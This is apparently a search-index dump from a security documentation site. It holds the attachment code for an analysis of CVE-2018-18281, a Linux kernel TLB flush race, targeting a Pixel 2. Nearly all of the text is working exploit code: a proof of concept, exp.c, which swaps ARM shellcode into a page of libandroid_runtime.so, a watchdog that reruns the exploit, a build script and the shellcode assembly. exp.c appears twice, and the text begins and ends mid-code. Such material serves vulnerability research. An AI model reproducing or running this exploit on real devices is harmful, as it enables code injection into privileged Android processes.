fine. we don't (intentionally)\n  // crash inside libc.\n  if (swap_count != 0) {\n    printf(\"***** SWAP COUNT: %d\\n\", swap_count);\n  }\n  if (slot_log != -1) {\n    printf(\"  ### SWAP AT SLOT: %d\\n\", slot_log);\n  }\n  for (int i=0; i<seen_values_ctr; i++) {\n    if (seen_values[i] != 0xccccccccccccccccUL) {\n      printf(\"  *** SEEN: 0x%016lx\\n\", seen_values[i]);\n    }\n  }\n\n  void *pin_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED|MAP_LOCKED, victim_file_fd, VICTIM_OFFSET);\n  if (pin_map == MAP_FAILED) {\n    err(1, \"FAIL0\");\n    exit(0);\n  }\n  unsigned long num = *(volatile long *)pin_map;\n  char hex[17];\n  for (int i=0; i<16; i++) {\n    int nibble = (num >> ((15-i) * 4)) & 0xf;\n    hex[i] = (nibble < 10) ? ('0' + nibble) : ('a' + (nibble - 10));\n  }\n  hex[16] = '\\0';\n  printf(\"target file page starts with: %s\\n\", hex);\n  if (num == 0xd4200000d4200000UL) {\n    unsigned int equal_bytes = 0;\n    while (equal_bytes < 0x1000) {\n      if (((unsigned char*)pin_map)[equal_bytes] != arm_shellcode_bin[equal_bytes]) break;\n      equal_bytes++;\n    }\n    if (equal_bytes == 0x1000) {\n      printf(\"STAGE 1 OK\\n\");\n      tell_succ();\n      //while (1) pause();\n    } else {\n      printf(\"ERROR: stage 1 diverges @0x%x, retry\\n\", equal_bytes);\n    }\n  }\n  sleep(1);\n  exit(0);\n}\n\nvoid *read_worker(void *dummy) {\n  pin_to(CORE_CLOBBER);\n\n  bool pin_to_slot = false;\n  while (1) { for (int i=0; i<TLB_USAGE; i++) {\nretry_swap:;\n    unsigned long expected = EXPECTED_CODE;\n    unsigned long *addr = (unsigned long *)(ADDR1 + 0x1000UL * i);\n    bool swapped = __atomic_compare_exchange_n(\n      addr,\n      &expected,\n      0x1337133713371337UL,\n      false, __ATOMIC_RELAXED, __ATOMIC_RELAXED\n    );\n    if (swapped) {\n      pin_to_slot = true;\n      swap_count++;\n      slot_log = i;\n      while (1) {\n        memcpy(addr, arm_shellcode_bin, sizeof(arm_shellcode_bin));\n      }\n    } else {\n      *(volatile char *)arm_shellcode_bin;\n      *(volatile char *)(arm_shellcode_bin+0xfff);\n      for (int i=0; i<seen_values_ctr; i++) {\n        if (seen_values[i] == expected) goto end_swapfail;\n      }\n      if (seen_values_ctr < 1000) {\n        seen_values[seen_values_ctr++] = expected;\n      }\nend_swapfail:;\n    }\n  } }\n}\n\nint kickout_victim_page(void) {\n  unsigned long off;\n  setbuf(stdout, NULL);\n\n  int fd = open(VICTIM_FILE, O_RDONLY);\n  if (fd == -1) err(1, \"open\");\n  char *victim_map = mmap(NULL, VICTIM_SIZE, PROT_READ, MAP_SHARED, fd, 0);\n  if (victim_map == MAP_FAILED) err(1, \"mmap\");\n  if (madvise(victim_map, VICTIM_SIZE, MADV_RANDOM)) err(1, \"madv random\");\n  void *victim_page = victim_map + VICTIM_OFFSET;\n  printf(\"in core initially: %d\\n\", (int)check_in_core(victim_page));\n\n  int spam_fd = open(\"spam_file\", O_RDWR|O_CREAT|O_TRUNC, 0666);\n  if (fallocate(spam_fd, 0, 0, SPAM_SIZE)) err(1, \"fallocate\");\n\n  // https://arxiv.org/pdf/1710.00551.pdf (\"Another Flip in the Wall of\n  // Rowhammer Defenses\"), section VIII-B says:\n  // \"A fundamental observation we made is that the replacement algorithm of the\n  //  Linux page cache prioritizes eviction of nonexecutable pages over\n  //  executable pages.\"\n  // In shrink_active_list() and page_check_references() in mm/vmscan.c, you can\n  // see that file-backed executable pages get special handling.\n  char *spam_map = mmap(NULL, SPAM_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, spam_fd, 0);\n  if (spam_map == MAP_FAILED) err(1, \"mmap spam\");\n\nrestart:\n  printf(\"starting\\n\");\n  unsigned long ts = get_us();\n  while (1) {\n    for (off = 0; off < SPAM_SIZE; off += 0x1000UL) {\n\n      unsigned long cts = get_us();\n      if (cts > ts + 300000) {\n        if (!check_in_core(victim_page)) goto read_around;\n        ts = cts;\n      }\n\n      *(volatile unsigned long *)(spam_map + off);\n    }\n    bool ic = check_in_core(victim_page);\n    printf(\"in core (spamming): %d\\n\", (int)ic);\n    if (!ic) break;\n  }\nread_around:\n  printf(\"starting read-around\\n\");\n  for (off = 0; off < VICTIM_SIZE; off += 0x1000) {\n    if (off == VICTIM_OFFSET) continue;\n    //printf(\"RA at 0x%lx\\n\", off);\n    bool ic = check_in_core(victim_page);\n    if (ic) {\n      printf(\"!!! back in core\\n\");\n      goto restart;\n    }\n    *(volatile char *)(victim_map + off);\n  }\n  printf(\"stopping\\n\");\n\n  return 0;\n}\n\nint trigger(void) {\n  setbuf(stdout, NULL);\n\n  signal(SIGSEGV, segv_handler);\n\n  victim_file_fd = open(VICTIM_FILE, O_RDONLY);\n  if (victim_file_fd == -1) err(1, \"unable to open victim file\");\n  if (posix_fadvise(victim_file_fd, 0, 0, POSIX_FADV_RANDOM)) err(1, \"posix_fadvise\");\n\n  pin_to(CORE_MUNMAP);\n\n  if (pipe(worker_launch_pipe) || pipe(spinner_cont_pipe))\n    err(1, \"pipe\");\n\n  file_fd = syscall(__NR_memfd_create, \"truncate-me\", 0);\n  if (file_fd == -1) err(1, \"create\");\n  if (ftruncate(file_fd, AREA_SIZE)) err(1, \"trunc init\");\n  if (mmap(ADDR1, AREA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, file_fd, 0) != ADDR1)\n    err(1, \"mmap 1\");\n  if (madvise(ADDR1, AREA_SIZE, MADV_NOHUGEPAGE) && errno != EINVAL)\n    err(1, \"advice\");\n  memset(ADDR1, 0xcc, AREA_SIZE);\n\n  pthread_t thread;\n  if (pthread_create(&thread, NULL, idle_worker, NULL))\n    err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, spinner, NULL))\n    err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, nicer_spinner, NULL))\n    err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, read_worker, NULL))\n    err(1, \"pthread_create\");\n\n  pin_to(CORE_PREEMPT);\n\n  char wlpc;\n  if (read(worker_launch_pipe[0], &wlpc, 1) != 1 || read(worker_launch_pipe[0], &wlpc, 1) != 1)\n    errx(1, \"read wlp\");\n\n  sleep(1);\n\n  int status_fd = open(\"/proc/self/status\", O_RDONLY);\n  if (status_fd == -1)\n    err(1, \"open status\");\n\n  unsigned long orig = get_pt_size(status_fd);\n  int bumped = 0;\n  while (1) {\n    unsigned long nsize = get_pt_size(status_fd);\n    if (nsize != orig) {\n      spinner_verbose = 1;\n      if (!bumped) {\n        if (write(spinner_cont_pipe[1], \"x\", 1) != 1)\n          errx(1, \"spinner_cont_pipe\");\n\n        bumped = 1;\n      }\n\n      orig = nsize;\n    }\n  }\n\n  pause();\n}\n\nint main(int argc, char** argv)\n{\n    kickout_victim_page();\n    trigger();\n}\n\n\n\n\nwatchdog.c\n\n\n// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n// 20190304, chengjia4574@gmail.com\n// code is from Jann Horn\n\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <sys/syscall.h>\n#include <pthread.h>\n#include <sched.h>\n#include <err.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/time.h>\n#include <errno.h>\n#include <sys/prctl.h>\n#include <signal.h>\n\nvoid gethost(){\n    char host[64];\n    int ret = -1;\n    ret = gethostname(host, 64);\n    if(!ret)\n        printf(\"read hostname : %s\\n\", host);\n}\n\nvoid sethost(){\n    char *h = \"jiayy-hostname\";\n    int ret = -1;\n    ret = syscall(__NR_sethostname, h, strlen(h));\n    if(!ret)\n        printf(\"success \\n\");\n    else\n        perror(\"errno \\n\");\n\n}\n\n\nvoid signal_handler(int signo) {\n    if (signo == SIGCHLD) {\n        pid_t pid;\n        while ((pid = waitpid(-1, NULL, WNOHANG)) > 0) {\n            printf(\"SIGCHLD pid %d\\n\", pid);\n        }\n    }\n}\n\nvoid runexp() {\n        pid_t pid;\n    const char*  envs[] = {\"LD_LIBRARY_PATH=/vendor/lib64:/system/lib64\",\"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\",NULL};\n    const char*  args[] = {\"/system/bin/sh\",\"-c\",\"/data/local/tmp/exp\", NULL};\n\n        if((pid = fork()) < 0)\n                return;\n    else if(pid == 0)\n        execve(\"/system/bin/sh\", (char**)args, (char**)envs);\n\n    wait(pid);\n}\n\nvoid waitupanyapp() {\n        pid_t pid;\n    const char*  envs[] = {\"LD_LIBRARY_PATH=/vendor/lib64:/system/lib64\",\"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\",NULL};\n    const char*  args[] = {\"/system/bin/am\",\"start\",\"-n\",\"com.android.chrome/com.google.android.apps.chrome.Main\", NULL};\n\n        if((pid = fork()) < 0)\n                return;\n    else if(pid == 0)\n        execve(\"/system/bin/am\", (char**)args, (char**)envs);\n\n    wait(pid);\n}\n\n\nint main(int argc, char** argv)\n{\n    gethost();\n    if(access(\"/data/local/tmp/exp\",F_OK) != 0) {\n        printf(\"/data/local/tmp/exp not exist!\\n\");\n        exit(0);\n    }\n    if(access(\"/data/local/tmp/succ\",F_OK) == 0) {\n        unlink(\"/data/local/tmp/succ\");\n    }\n\n    while(1) {\n        runexp();\n        if(access(\"/data/local/tmp/succ\",F_OK) == 0) {\n            break;\n        }\n    }\n    printf(\"STAGE 2, you need to open an app to trigger shellcode(any app is ok), then you can run hostname to see if it prints u:r:zygote:s0\\n\"); \n    getchar();\n    gethost();\n}",
            "title": "Cve 2018 18281 \u9644\u4ef6"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#tlb-cve-2018-18281",
            "text": "",
            "title": "TLB \u7f13\u5b58\u5ef6\u8fdf\u5237\u65b0\u6f0f\u6d1e(cve-2018-18281)\u5206\u6790\u9644\u4ef6"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#poc",
            "text": "#define _GNU_SOURCE\n\n//I test the poc in pixel2 with fingerprint: google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n\n#include <pthread.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <err.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/prctl.h>\n#include <sched.h>\n#include <errno.h>\n#include <sys/syscall.h>\n\n#define ul unsigned long\n\nstatic int alloc_fd = -1;\nint g_worker_tid;\nint worker_launch_pipe[2];\nint spinner_cont_pipe[2];\n\n#define allocptr ((void*)0x1000000000UL)\n#define allocptr2 ((void*)0x2000000000UL)\n#define TLB_USAGE 200\n#define AREA_SIZE   0x20000000\n#define CORE_0  3\n#define CORE_1 4\n#define CORE_2 5 \n#define CORE_3 6 \n\nvoid pin_task_to(int pid, int cpu) {\n  cpu_set_t cset;\n  CPU_ZERO(&cset);\n  CPU_SET(cpu, &cset);\n  if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))\n    err(1, \"affinity\");\n}\nvoid pin_to(int cpu) { pin_task_to(0, cpu); }\n\nunsigned long get_pt_size(int status_fd) {\n  char buf[0x1000 + 1];\n  ssize_t res = pread(status_fd, buf, 0x1000, 0);\n  if (res <= 0)\n    err(1, \"status read\");\n  buf[res] = 0;\n  char *p = strstr(buf, \"VmPTE:\");\n  if (!p) errx(1, \"bad status\");\n  p +=  6;\n  while (*p == '\\t' || *p == ' ') p++;\n  return strtoul(p, NULL, 10);\n}\n\nvoid tell_succ() {\n  int fd = open(\"/data/local/tmp/succ\", O_CREAT|O_RDWR);\n  write(fd, \"stage 1 ok\", 16);\n  close(fd);\n}\n\nvoid *nicer_spinner(void *dummy) {\n  pin_to(CORE_0);\n  while (1);\n}\n\nvoid *reader_fn(void *dummy) {\n  pin_to(CORE_3);\n  while (1) {\n   for (int i=0; i<TLB_USAGE; i++) {\n    ul x = *(ul *)(allocptr + 0x1000UL * i);\n    if (x != 0x4141414141414141UL) {\n      printf(\"GOT 0x%016lx\\n\", x);\n      tell_succ();\n    }\n  }\n  }\n}\n\nvoid *truncate_fn(void *dummy) {\n  pin_to(CORE_1);\n\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  char scpc;\n  if (read(spinner_cont_pipe[0], &scpc, 1) != 1)\n    errx(1, \"read scp\");\n\n  pin_task_to(g_worker_tid, CORE_0);\n     //if (ftruncate(alloc_fd, 0)) err(1, \"ftruncate\");\n     if (fallocate(alloc_fd, FALLOC_FL_PUNCH_HOLE|FALLOC_FL_KEEP_SIZE, 0, TLB_USAGE*0x1000)) err(1, \"fallocate\");\n\n    while (1) pause();\n\n}\n\nvoid *idle_worker(void *dummy) {\n  g_worker_tid = syscall(__NR_gettid);\n\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  struct sched_param param = {\n    .sched_priority = 0\n  };\n  if (sched_setscheduler(0, SCHED_IDLE, &param))\n    err(1, \"sched_setscheduler\");\n\n  sleep(2); \n\n  if (mremap(allocptr, AREA_SIZE, AREA_SIZE, MREMAP_FIXED|MREMAP_MAYMOVE, allocptr2) != allocptr2) err(1, \"mremap\");\n\n  while (1) pause();\n}\n\nint main(void) {\n  setbuf(stdout, NULL);\n\n  printf(\"try triggerring..\\n\");\n\n  pin_to(CORE_1);\n\n  if (pipe(worker_launch_pipe) || pipe(spinner_cont_pipe))\n    err(1, \"pipe\");\n\n  alloc_fd = syscall(__NR_memfd_create, \"truncate-me\", 0);\n  if (alloc_fd == -1) err(1, \"create\");\n  if (ftruncate(alloc_fd, AREA_SIZE)) err(1, \"trunc init\");\n  if (mmap(allocptr, AREA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, alloc_fd, 0) != allocptr)\n    err(1, \"mmap 1\");\n  if (madvise(allocptr, AREA_SIZE, MADV_NOHUGEPAGE) && errno != EINVAL)\n    err(1, \"advice\");\n  memset(allocptr, 0x41, AREA_SIZE);\n\n  pthread_t thread;\n  if (pthread_create(&thread, NULL, idle_worker, NULL)) err(1, \"idler\");\n  if (pthread_create(&thread, NULL, truncate_fn, NULL)) err(1, \"truncater\");\n  if (pthread_create(&thread, NULL, nicer_spinner, NULL)) err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, reader_fn, NULL)) errx(1, \"reader\");\n\n  pin_to(CORE_2);\n\n  char wlpc;\n  if (read(worker_launch_pipe[0], &wlpc, 1) != 1 || read(worker_launch_pipe[0], &wlpc, 1) != 1)\n    errx(1, \"read wlp\");\n\n  int status_fd = open(\"/proc/self/status\", O_RDONLY);\n  if (status_fd == -1)\n    err(1, \"open status\");\n\n  unsigned long orig = get_pt_size(status_fd);\n  int bumped = 0;\n  while (1) {\n    unsigned long nsize = get_pt_size(status_fd);\n    if (nsize != orig) {\n      if (!bumped) {\n        if (write(spinner_cont_pipe[1], \"x\", 1) != 1)\n          errx(1, \"spinner_cont_pipe\");\n\n        bumped = 1;\n      }\n\n      orig = nsize;\n    }\n  }\n\n  pause();\n\n  return 0;\n}",
            "title": "poc \u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#exp",
            "text": "",
            "title": "exp \u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#compilesh",
            "text": "!/bin/sh\n\n# This should be a C compiler from an android \"standalone toolchain\" as\n# documented at <https://developer.android.com/ndk/guides/standalone_toolchain>.\n# Statically linking against glibc doesn't work here because for multithreaded\n# code, glibc tries to use set_robust_list, which immediately causes the program\n# to be killed by seccomp.\n#CC=$HOME/android-sdk/sa-tch/bin/clang\nCC=/data3/aosp/prebuilts/clang/host/linux-x86/clang-4579689/bin/clang\n\n# Prepare shellcode - this can use any aarch64 toolchain.\n# NOTE: We are changing the page-relative alignment of the shellcode, so normal\n# aarch64 RIP-relative addressing doesn't work.\naarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  # \u5c06\u6c47\u7f16\u6587\u4ef6 arm_shellcode.s \u6c47\u7f16\u6210 .o \u6587\u4ef6\naarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode # \u5c06 .o \u94fe\u63a5\u6210\u53ef\u6267\u884c elf \u6587\u4ef6\naarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode # \u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5 .text \u63d0\u53d6\u5230\u6587\u4ef6 arm_shellcode.bin \nxxd -i arm_shellcode.bin > arm_shellcode.h # \u5c06\u4e8c\u8fdb\u5236\u6587\u4ef6\u653e\u8fdb\u4e00\u4e2ac \u8bed\u8a00\u5206\u683c\u7684\u6570\u7ec4\u53d8\u91cf\uff0c\u540e\u7eed\u5728c\u4ee3\u7801\u91cc\u4ee5\u6570\u7ec4\u64cd\u4f5c\u5b83\nrm arm_shellcode.o arm_shellcode arm_shellcode.bin\n# need android-ndk-r18b to build\nmake",
            "title": "compile.sh"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#arm_shellcodes",
            "text": ".global _start\n\n// signature\nfile_start:\nbrk #0\nbrk #0\n\n// open file\n_start:\nmov x0, #-100\nadrp x1, _start\n// NOTE: We are changing the page-relative alignment of the shellcode, so normal\n// aarch64 RIP-relative addressing doesn't work.\nadd x1, x1, attr_path-file_start\nmov x2, #0\nmov x8, #0x38\nsvc #0\n\n// read from file\nsub sp, sp, #128\nmov x1, sp\nmov x2, #128\nmov x8, #0x3f\nsvc #0\n\n// shove file contents into hostname\nmov x1, x0\nmov x0, sp\nmov x8, #0xa1\nsvc #0\n\n// spin\nspin_label:\nb spin_label\n\nattr_path:\n.ascii \"/proc/self/attr/current\\0\"\n\nrept_start:\n.rept (0x1000 - (rept_start - file_start)) / 4\nb _start\n.endr",
            "title": "arm_shellcode.s"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#expc",
            "text": "// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n// 20190304, chengjia4574@gmail.com\n// code is from Jann Horn\n\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <sys/syscall.h>\n#include <pthread.h>\n#include <sched.h>\n#include <err.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/time.h>\n#include <errno.h>\n#include <sys/prctl.h>\n#include <signal.h>\n\n\n#include \"arm_shellcode.h\"\n\n#define RAM_SIZE (3744240UL*1024UL)\n#define SPAM_SIZE (RAM_SIZE * 2)\n\n#define VICTIM_FILE \"/system/lib64/libandroid_runtime.so\"\n#define VICTIM_SIZE   0x21cef0\n#define VICTIM_OFFSET 0x157000\n#define EXPECTED_CODE 0xeb08005f91007108UL\n\n#define CORE_TARPIT  3\n#define CORE_MUNMAP  4\n#define CORE_CLOBBER 5\n#define CORE_PREEMPT 6\n\n#define TLB_USAGE 200\n\n#define ADDR1 ((void*)0x1000000000UL)\n#define ADDR2 ((void*)0x2000000000UL)\n\n#define AREA_SIZE   0x20000000\n\nint file_fd = -1;\nint victim_file_fd = -1;\nint worker_launch_pipe[2];\nint spinner_cont_pipe[2];\nvolatile int worker_tid = -1;\nvolatile int spinner_verbose = 0;\nvolatile int spinner_tid = -1;\nvolatile int spinner_state = 0;\nvolatile int worker_seen_spinner = 0;\nvolatile int swap_count;\nvolatile unsigned long seen_values[1000];\nvolatile int seen_values_ctr = 0;\nvolatile int slot_log = -1;\n\nbool check_in_core(void *ptr) {\n  unsigned char c;\n  if (mincore(ptr, 0x1000, &c)) err(1, \"mincore\");\n  return c & 1;\n}\n\nvoid pin_task_to(int pid, int cpu) {\n  cpu_set_t cset;\n  CPU_ZERO(&cset);\n  CPU_SET(cpu, &cset);\n  if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))\n    err(1, \"affinity\");\n}\nvoid pin_to(int cpu) { pin_task_to(0, cpu); }\n\nunsigned long get_us() {\n  struct timeval tv;\n  if (gettimeofday(&tv, NULL))\n    err(1, \"gettimeofday\");\n  return ((unsigned long)tv.tv_sec)*1000000UL + (unsigned long)tv.tv_usec;\n}\n\nunsigned long get_pt_size(int status_fd) {\n  char buf[0x1000 + 1];\n  ssize_t res = pread(status_fd, buf, 0x1000, 0);\n  if (res <= 0)\n    err(1, \"status read\");\n  buf[res] = 0;\n  char *p = strstr(buf, \"VmPTE:\");\n  if (!p) errx(1, \"bad status\");\n  p +=  6;\n  while (*p == '\\t' || *p == ' ') p++;\n  return strtoul(p, NULL, 10);\n}\n\nvoid *idle_worker(void *dummy) {\n  worker_tid = syscall(__NR_gettid);\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  struct sched_param param = {\n    .sched_priority = 0\n  };\n  if (sched_setscheduler(0, SCHED_IDLE, &param))\n    err(1, \"sched_setscheduler\");\n\n  sleep(2);\n\n  if (mremap(ADDR1, AREA_SIZE, AREA_SIZE, MREMAP_FIXED|MREMAP_MAYMOVE, ADDR2) != ADDR2)\n    err(1, \"mremap\");\n\n  while (1) pause();\n}\n\nvoid *nicer_spinner(void *dummy) {\n  pin_to(CORE_TARPIT);\n  while (1);\n}\n\nvoid *spinner(void *dummy) {\n  bool trunc_seen = false;\n  spinner_tid = syscall(__NR_gettid);\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  int wss_shown = 0;\n\n  char scpc;\n  if (read(spinner_cont_pipe[0], &scpc, 1) != 1)\n    errx(1, \"read scp\");\n\n  while (1) {\n    int wss = worker_seen_spinner;\n    if (wss != wss_shown) {\n      wss_shown = wss;\n      printf(\"worker has seen %d\\n\", wss);\n    }\n    if (spinner_verbose) {\n      if (!trunc_seen) {\n        spinner_state++;\n        pin_task_to(worker_tid, CORE_TARPIT);\n        if (fallocate(file_fd, FALLOC_FL_PUNCH_HOLE|FALLOC_FL_KEEP_SIZE, 0, TLB_USAGE*0x1000)) err(1, \"fallocate\");\n        char dummy_buf[1];\n        if (pread(victim_file_fd, dummy_buf, 1, VICTIM_OFFSET) != 1) err(1, \"pread\");\n\n        void *pin_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED|MAP_LOCKED, victim_file_fd, VICTIM_OFFSET);\n        if (pin_map == MAP_FAILED) {\n          err(1, \"pin_map\");\n        }\n\n        while (1) /*spin*/;\n      }\n      spinner_verbose = 0;\n      spinner_state++;\n      printf(\"spinnnnner\\n\");\n    }\n  }\n}\n\nvoid tell_succ() {\n  int fd = open(\"/data/local/tmp/succ\", O_CREAT);\n  write(fd, \"stage 1 ok\", 16);\n  close(fd);\n}\n\n\nvoid segv_handler(int dummy) {\n  write(1, \"TLB flush received\\n\", 19);\n\n  // yes, yes, stdio in signal handler. it's fine. we don't (intentionally)\n  // crash inside libc.\n  if (swap_count != 0) {\n    printf(\"***** SWAP COUNT: %d\\n\", swap_count);\n  }\n  if (slot_log != -1) {\n    printf(\"  ### SWAP AT SLOT: %d\\n\", slot_log);\n  }\n  for (int i=0; i<seen_values_ctr; i++) {\n    if (seen_values[i] != 0xccccccccccccccccUL) {\n      printf(\"  *** SEEN: 0x%016lx\\n\", seen_values[i]);\n    }\n  }\n\n  void *pin_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED|MAP_LOCKED, victim_file_fd, VICTIM_OFFSET);\n  if (pin_map == MAP_FAILED) {\n    err(1, \"FAIL0\");\n    exit(0);\n  }\n  unsigned long num = *(volatile long *)pin_map;\n  char hex[17];\n  for (int i=0; i<16; i++) {\n    int nibble = (num >> ((15-i) * 4)) & 0xf;\n    hex[i] = (nibble < 10) ? ('0' + nibble) : ('a' + (nibble - 10));\n  }\n  hex[16] = '\\0';\n  printf(\"target file page starts with: %s\\n\", hex);\n  if (num == 0xd4200000d4200000UL) {\n    unsigned int equal_bytes = 0;\n    while (equal_bytes < 0x1000) {\n      if (((unsigned char*)pin_map)[equal_bytes] != arm_shellcode_bin[equal_bytes]) break;\n      equal_bytes++;\n    }\n    if (equal_bytes == 0x1000) {\n      printf(\"STAGE 1 OK\\n\");\n      tell_succ();\n      //while (1) pause();\n    } else {\n      printf(\"ERROR: stage 1 diverges @0x%x, retry\\n\", equal_bytes);\n    }\n  }\n  sleep(1);\n  exit(0);\n}\n\nvoid *read_worker(void *dummy) {\n  pin_to(CORE_CLOBBER);\n\n  bool pin_to_slot = false;\n  while (1) { for (int i=0; i<TLB_USAGE; i++) {\nretry_swap:;\n    unsigned long expected = EXPECTED_CODE;\n    unsigned long *addr = (unsigned long *)(ADDR1 + 0x1000UL * i);\n    bool swapped = __atomic_compare_exchange_n(\n      addr,\n      &expected,\n      0x1337133713371337UL,\n      false, __ATOMIC_RELAXED, __ATOMIC_RELAXED\n    );\n    if (swapped) {\n      pin_to_slot = true;\n      swap_count++;\n      slot_log = i;\n      while (1) {\n        memcpy(addr, arm_shellcode_bin, sizeof(arm_shellcode_bin));\n      }\n    } else {\n      *(volatile char *)arm_shellcode_bin;\n      *(volatile char *)(arm_shellcode_bin+0xfff);\n      for (int i=0; i<seen_values_ctr; i++) {\n        if (seen_values[i] == expected) goto end_swapfail;\n      }\n      if (seen_values_ctr < 1000) {\n        seen_values[seen_values_ctr++] = expected;\n      }\nend_swapfail:;\n    }\n  } }\n}\n\nint kickout_victim_page(void) {\n  unsigned long off;\n  setbuf(stdout, NULL);\n\n  int fd = open(VICTIM_FILE, O_RDONLY);\n  if (fd == -1) err(1, \"open\");\n  char *victim_map = mmap(NULL, VICTIM_SIZE, PROT_READ, MAP_SHARED, fd, 0);\n  if (victim_map == MAP_FAILED) err(1, \"mmap\");\n  if (madvise(victim_map, VICTIM_SIZE, MADV_RANDOM)) err(1, \"madv random\");\n  void *victim_page = victim_map + VICTIM_OFFSET;\n  printf(\"in core initially: %d\\n\", (int)check_in_core(victim_page));\n\n  int spam_fd = open(\"spam_file\", O_RDWR|O_CREAT|O_TRUNC, 0666);\n  if (fallocate(spam_fd, 0, 0, SPAM_SIZE)) err(1, \"fallocate\");\n\n  // https://arxiv.org/pdf/1710.00551.pdf (\"Another Flip in the Wall of\n  // Rowhammer Defenses\"), section VIII-B says:\n  // \"A fundamental observation we made is that the replacement algorithm of the\n  //  Linux page cache prioritizes eviction of nonexecutable pages over\n  //  executable pages.\"\n  // In shrink_active_list() and page_check_references() in mm/vmscan.c, you can\n  // see that file-backed executable pages get special handling.\n  char *spam_map = mmap(NULL, SPAM_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, spam_fd, 0);\n  if (spam_map == MAP_FAILED) err(1, \"mmap spam\");\n\nrestart:\n  printf(\"starting\\n\");\n  unsigned long ts = get_us();\n  while (1) {\n    for (off = 0; off < SPAM_SIZE; off += 0x1000UL) {\n\n      unsigned long cts = get_us();\n      if (cts > ts + 300000) {\n        if (!check_in_core(victim_page)) goto read_around;\n        ts = cts;\n      }\n\n      *(volatile unsigned long *)(spam_map + off);\n    }\n    bool ic = check_in_core(victim_page);\n    printf(\"in core (spamming): %d\\n\", (int)ic);\n    if (!ic) break;\n  }\nread_around:\n  printf(\"starting read-around\\n\");\n  for (off = 0; off < VICTIM_SIZE; off += 0x1000) {\n    if (off == VICTIM_OFFSET) continue;\n    //printf(\"RA at 0x%lx\\n\", off);\n    bool ic = check_in_core(victim_page);\n    if (ic) {\n      printf(\"!!! back in core\\n\");\n      goto restart;\n    }\n    *(volatile char *)(victim_map + off);\n  }\n  printf(\"stopping\\n\");\n\n  return 0;\n}\n\nint trigger(void) {\n  setbuf(stdout, NULL);\n\n  signal(SIGSEGV, segv_handler);\n\n  victim_file_fd = open(VICTIM_FILE, O_RDONLY);\n  if (victim_file_fd == -1) err(1, \"unable to open victim file\");\n  if (posix_fadvise(victim_file_fd, 0, 0, POSIX_FADV_RANDOM)) err(1, \"posix_fadvise\");\n\n  pin_to(CORE_MUNMAP);\n\n  if (pipe(worker_launch_pipe) || pipe(spinner_cont_pipe))\n    err(1, \"pipe\");\n\n  file_fd = syscall(__NR_memfd_create, \"truncate-me\", 0);\n  if (file_fd == -1) err(1, \"create\");\n  if (ftruncate(file_fd, AREA_SIZE)) err(1, \"trunc init\");\n  if (mmap(ADDR1, AREA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, file_fd, 0) != ADDR1)\n    err(1, \"mmap 1\");\n  if (madvise(ADDR1, AREA_SIZE, MADV_NOHUGEPAGE) && errno != EINVAL)\n    err(1, \"advice\");\n  memset(ADDR1, 0xcc, AREA_SIZE);\n\n  pthread_t thread;\n  if (pthread_create(&thread, NULL, idle_worker, NULL))\n    err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, spinner, NULL))\n    err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, nicer_spinner, NULL))\n    err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, read_worker, NULL))\n    err(1, \"pthread_create\");\n\n  pin_to(CORE_PREEMPT);\n\n  char wlpc;\n  if (read(worker_launch_pipe[0], &wlpc, 1) != 1 || read(worker_launch_pipe[0], &wlpc, 1) != 1)\n    errx(1, \"read wlp\");\n\n  sleep(1);\n\n  int status_fd = open(\"/proc/self/status\", O_RDONLY);\n  if (status_fd == -1)\n    err(1, \"open status\");\n\n  unsigned long orig = get_pt_size(status_fd);\n  int bumped = 0;\n  while (1) {\n    unsigned long nsize = get_pt_size(status_fd);\n    if (nsize != orig) {\n      spinner_verbose = 1;\n      if 